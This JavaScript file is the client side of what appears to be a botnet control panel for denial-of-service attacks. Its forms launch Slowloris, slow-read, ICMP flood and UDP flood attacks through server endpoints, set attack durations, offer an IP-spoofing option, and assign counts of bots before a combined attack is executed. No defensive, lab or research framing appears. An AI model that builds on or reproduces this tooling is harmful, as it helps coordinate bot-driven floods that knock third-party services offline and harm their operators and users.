$(document).ready(function () {
     
  $("#slowloris_form").on("submit", function (e) {
    e.preventDefault();
    var formData = $(this).serialize();

    var attack_duration = $("#attack_duration").val();
    console.log(attack_duration)
    formData += "&attack_duration=" + attack_duration;


    $.ajax({
      type: "POST",
      url: "/slowloris",
      data: formData,
      success: function (data) {
        console.log(data);
      },
      error: function (xhr, status, error) {
        console.log("Error: " + error);
      },
    });
    $('#slowlorisModal').modal('hide');

  });

  $("#slow_read_form").on("submit", function (e) {
    e.preventDefault();
    var formData = $(this).serialize();

    $.ajax({
      type: "POST",
      url: "/slow_read",
      data: formData,
      success: function (data) {
        console.log(data);
      },
      error: function (xhr, status, error) {
        console.log("Error: " + error);
      },
    });
  });

  $("#icmp_flood_form").on("submit", function (e) {
    e.preventDefault();
    var formData = $(this).serialize();

    $.ajax({
      type: "POST",
      url: "/icmp_flood",
      data: formData,
      success: function (data) {
        console.log(data);
      },
      error: function (xhr, status, error) {
        console.log("Error: " + error);
      },
    });
    $('#icmpFloodModal').modal('hide');

  });


  $("#udp_flood_form").on("submit", function (e) {
    e.preventDefault();
    var formData = $(this).serialize();

    $.ajax({
      type: "POST",
      url: "/udp_flood",
      data: formData,
      success: function (data) {
        console.log(data);
      },
      error: function (xhr, status, error) {
        console.log("Error: " + error);
      },
    });
  });

  $("#stop_attack").on("click", function (e) {
    e.preventDefault();
    $.getJSON("/stop_attack", function (data) {
      console.log(data);
    });
  });

  $("#attack_option").change(function () {
    // Get the selected value and associated form element
    var selectedOption = $(this).val();
    var formElement = $("#" + $(this).find("option:selected").data("form"));
  
    // Hide all form elements and show the selected form element
    // $(".option-form").hide();
    formElement.show();
    $('#attack_option option[value=""]').prop('selected', true);
  });

  
  document
    .getElementById("spoof_select")
    .addEventListener("change", function () {
      var inputDiv = document.getElementById("ip_address_input");
      if (this.value === "yes") {
        inputDiv.style.display = "block";
      } else {
        inputDiv.style.display = "none";
      }
    });
  
  // $("#execute_attacks").on("submit", function (e) {

  //   e.preventDefault();
  //   var formData = $(this).serialize();

  //   var icmp_flood_bot_count = $("#icmp_flood_bot_count").val();
  //   console.log(icmp_flood_bot_count)
  //   formData += "&icmp_flood_bot_count=" + icmp_flood_bot_count;

  //   var slowloris_bot_count = $("#slowloris_bot_count").val();
  //   console.log(slowloris_bot_count)
  //   formData += "&slowloris_bot_count=" + slowloris_bot_count;

  //   $.ajax({
  //     type: "POST",
  //     url: "/execute_attacks",
  //     data: formData,
  //     success: function (data) {
  //       console.log(data);
  //     },
  //     error: function (xhr, status, error) {
  //       console.log("Error: " + error);
  //     },
  //   });
  // });
  $("#execute_attacks").on("submit", function (e) {
    e.preventDefault();
  
    var form = $(this);


    $.ajax({
      type: "GET",
      url: "/count_bots",
      success: function (bot_count) {
        var formData = form.serialize();
        var icmp_flood_bot_count = $("#icmp_flood_bot_count").val();
        formData += "&icmp_flood_bot_count=" + icmp_flood_bot_count;
        var slowloris_bot_count = $("#slowloris_bot_count").val();
        formData += "&slowloris_bot_count=" + slowloris_bot_count;
  
        if ((parseInt(icmp_flood_bot_count) + parseInt(slowloris_bot_count)) > bot_count) {
          alert("Insufficient number of bots");
          return;
        }
  
        $.ajax({
          type: "POST",
          url: "/execute_attacks",
          data: formData,
          success: function (data) {
            console.log(data);
          },
          error: function (xhr, status, error) {
            console.log("Error: " + error);
          },
        });
      },
      error: function (xhr, status, error) {
        console.log("Error: " + error);
      },
    });
  });
});

